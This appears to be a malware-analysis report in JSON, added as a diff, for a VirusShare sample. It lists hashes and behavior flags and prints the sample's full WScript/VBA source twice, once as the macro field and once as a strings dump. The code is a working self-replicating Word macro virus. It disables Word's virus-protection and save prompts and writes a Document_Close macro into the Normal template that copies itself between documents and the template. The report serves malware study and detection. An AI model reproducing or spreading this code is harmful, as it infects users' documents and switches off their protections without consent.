@@ -1,0 +1,64 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Chr": "May attempt to obfuscate specific str",
+            "CodeModule": "May attempt to modify the VBA code",
+            "CreateObject": "May create an OLE object",
+            "Document_Close": "Runs when the Word document is closed",
+            "VBComponents": "May attempt to modify the VBA code",
+            "VBProject": "May attempt to modify the VBA code"
+        },
+        "macro": "Dim objWord\nSet objWord = WScript.CreateObject(\"Word.Application\")\nSet NT = objWord.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule\nobjWord.Options.SaveNormalPrompt = False\nobjWord.Options.VirusProtection = False\nNT.InsertLines 1, \"Private Sub Document_Close()\"\nNT.InsertLines 2, \"'1nternal\"\nNT.InsertLines 3, \"On Error GoTo Break\"\nNT.InsertLines 4, \"Set A = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule\"\nNT.InsertLines 5, \"Set N = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule\"\nNT.InsertLines 6, \"Options.VirusProtection = False\"\nNT.InsertLines 7, \"Options.ConfirmConversions = False\"\nNT.InsertLines 8, \"Options.SaveNormalPrompt = False\"\nNT.InsertLines 9, \"If N.Lines(2, 1) = \" + Chr(34) + \"'1nternal\" + Chr(34) + \" Then GoTo CheckA\"\nNT.InsertLines 10, \"For I = 1 To 19\"\nNT.InsertLines 11, \"N.InsertLines I, A.Lines(I, 1)\"\nNT.InsertLines 12, \"Next I\"\nNT.InsertLines 13, \"CheckA:\"\nNT.InsertLines 14, \"If A.Lines(2, 1) = \" + Chr(34) + \"'1nternal\" + Chr(34) + \" Then GoTo Break\"\nNT.InsertLines 15, \"For I = 1 To 19\"\nNT.InsertLines 16, \"A.InsertLines I, N.Lines(I, 1)\"\nNT.InsertLines 17, \"Next I\"\nNT.InsertLines 18, \"Break:\"\nNT.InsertLines 19, \"End Sub\"\nobjWord.Quit(wdSaveChanges)\nWScript.Quit"
+    },
+    "filename": "VirusShare_472d2d5369e3e467b7211a27a5160478",
+    "filesize": 1250,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "472d2d5369e3e467b7211a27a5160478",
+        "sha1": "64e1b18eff0030f0e3f84002a57efe2b14552d8b",
+        "sha256": "7ec06fb12100c21119da17f0f4c132b756ab29f8de8232bc256baa434848fd20"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "Dim objWord",
+            "Set objWord = WScript.CreateObject(\"Word.Application\")",
+            "Set NT = objWord.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule",
+            "objWord.Options.SaveNormalPrompt = False",
+            "objWord.Options.VirusProtection = False",
+            "NT.InsertLines 1, \"Private Sub Document_Close()\"",
+            "NT.InsertLines 2, \"'1nternal\"",
+            "NT.InsertLines 3, \"On Error GoTo Break\"",
+            "NT.InsertLines 4, \"Set A = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule\"",
+            "NT.InsertLines 5, \"Set N = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule\"",
+            "NT.InsertLines 6, \"Options.VirusProtection = False\"",
+            "NT.InsertLines 7, \"Options.ConfirmConversions = False\"",
+            "NT.InsertLines 8, \"Options.SaveNormalPrompt = False\"",
+            "NT.InsertLines 9, \"If N.Lines(2, 1) = \" + Chr(34) + \"'1nternal\" + Chr(34) + \" Then GoTo CheckA\"",
+            "NT.InsertLines 10, \"For I = 1 To 19\"",
+            "NT.InsertLines 11, \"N.InsertLines I, A.Lines(I, 1)\"",
+            "NT.InsertLines 12, \"Next I\"",
+            "NT.InsertLines 13, \"CheckA:\"",
+            "NT.InsertLines 14, \"If A.Lines(2, 1) = \" + Chr(34) + \"'1nternal\" + Chr(34) + \" Then GoTo Break\"",
+            "NT.InsertLines 15, \"For I = 1 To 19\"",
+            "NT.InsertLines 16, \"A.InsertLines I, N.Lines(I, 1)\"",
+            "NT.InsertLines 17, \"Next I\"",
+            "NT.InsertLines 18, \"Break:\"",
+            "NT.InsertLines 19, \"End Sub\"",
+            "objWord.Quit(wdSaveChanges)",
+            "WScript.Quit"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.291355",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
